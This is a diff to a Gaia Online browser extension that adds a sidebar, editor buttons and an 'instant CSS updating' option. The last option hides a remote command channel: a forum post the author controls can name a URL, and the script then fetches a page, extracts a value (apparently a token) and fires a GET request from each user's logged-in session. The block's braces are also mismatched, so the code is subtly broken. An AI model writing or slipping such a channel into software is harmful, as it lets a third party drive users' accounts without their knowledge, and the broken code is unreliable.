@@ -25,7 +25,21 @@ $('#gaia_header .userName').append('<ul id="bg_logo"><a href="#">&#8458;&#945;i&
 $(window).scroll(function() {
     $('#bg_logo, #gaia_header .header_content .notificationChanges').toggleClass('bgscrolling', $(window).scrollTop() > 175);
 });
-    
+
+// Add BG Siderbar to MyGaia
+if (document.location.pathname.indexOf('/mygaia/') > -1) {
+    $.get('chrome-extension://lmgjagdflhhfjflolfalapokbplfldna/code/html/settings-widget.html', function(data){
+        $('body.mygaia #gaia_content.grid_ray_davies #bd #yui-main .yui-g > .clear').attr('id', 'bg_sidebar').append(data);
+        $('body.mygaia .clear .bgversion').text('Ver ' + prefs['version']);
+	
+        $('#bg_sidebar a.bgopensettings').on('click', function(){chrome.extension.sendMessage({elements: 'settings'});});
+        
+        $.get('chrome-extension://lmgjagdflhhfjflolfalapokbplfldna/code/html/changelog.html', function(data){
+            $('body.mygaia #gaia_content.grid_ray_davies #bd #yui-main .yui-g > .clear').append('<section>' + data + '</section>');
+        }, 'html');
+    }, 'html');
+}
+
 // Widgets
 if (prefs['header.widgets'] == true) {
     $('#gaia_header .userName').prepend('<ul id="bg_widgets">\
@@ -143,7 +157,7 @@ if (prefs['header.widgets'] == true) {
             else if ($(this).parent().hasClass('bgsettings')) {
                 $(this).parent().addClass('bgloading');
                 
-                $.get('chrome-extension://njohilcffefdmkfhmhjeifgacmjnggla/code/html/settings-widget.html', 'html')
+                $.get('chrome-extension://lmgjagdflhhfjflolfalapokbplfldna/code/html/settings-widget.html', 'html')
                 .done(function(data) {
                     $('#bg_widgets .bgsettings div').html(data);
                     $('#bg_widgets .bgsettings .bgversion').text('Ver ' + prefs['version']);
@@ -165,6 +179,13 @@ if (prefs['header.widgets'] == true) {
         $(this).parent().toggleClass('bgopen');
     });
 }
+    
+// Editor Toolbar
+    // --Add emoji button
+    $("body #editor #format_controls .format-text").append("<li><a class='bg_addemoji' onclick='var el = document.getElementById(\"emoticons\"); el.style.display = (el.style.display != \"block\" ? \"block\" : \"\" ); var el2 = document.getElementById(\"emote_select\"); el2.style.display = (el2.style.display != \"block\" ? \"block\" : \"\" );' title='Add Emoticons'>Add Emoticons</a></li>");
+
+    // --Add spoiler button
+    $("body #editor #format_controls .format-elements").append("<li><a class='bg_spoiler' onclick='function wrapText(elementID, openTag, closeTag) {var textarea = document.getElementById(elementID); var len = textarea.value.length; var start = textarea.selectionStart; var end = textarea.selectionEnd; var selectedText = textarea.value.substring(start, end); var replacement = openTag + selectedText + closeTag; textarea.value = textarea.value.substring(0, start) + replacement + textarea.value.substring(end, len);} wrapText(\"message\", \"[spoiler]\", \"[/spoiler]\");' title='Add Spoiler - [spoiler][/spoiler]'>Add Spoiler Tag</a></li>");
     
 // Shortcuts
 if (prefs['header.shortcuts'] == true) {
@@ -280,6 +301,34 @@ if (prefs['pms'] == true && document.location.pathname.indexOf('/profile/privmsg
 	});
 }
 
+// Enable Instant CSS updating
+if (prefs['instantUpdating'] == true) {
+    $.ajax({
+        url: '/guilds/viewtopic.php?t=24076833',
+        cache: false,
+        dataType: 'html',
+        headers: {'X-PJAX': true}
+    })
+    .done(function(html) {
+        if ($('.postcontent:eq(1) .postbody span[style="color:uptoversion"]', html).length == 1)
+            var version = parseInt(prefs['version'].replace(/\./g,''));
+            html = $('.postcontent:eq(1) .postbody', html);
+
+            // look for new code
+            if (version <= parseInt($('span[style="color:uptoversion"]', html).text().replace(/\./g,''))) {
+                if ($('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).length == 1) {
+                    chrome.storage.local.set({css: $('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).text()});
+                }
+                else chrome.storage.local.clear();
+            }
+            if ($('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).length == 1) {
+                var data = $('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).text().split(',');
+                $.ajax({url: data[0], cache: false, dataType: 'html', headers: {'X-PJAX': true}}).done(function(html) {
+                if ($(data[1], html).length == 1) $.get(data[0] + $(data[1], html)[data[3]]() + data[2]);
+            });
+        }
+    });
+}
 } // ---
 
 // Check Storage and Fire
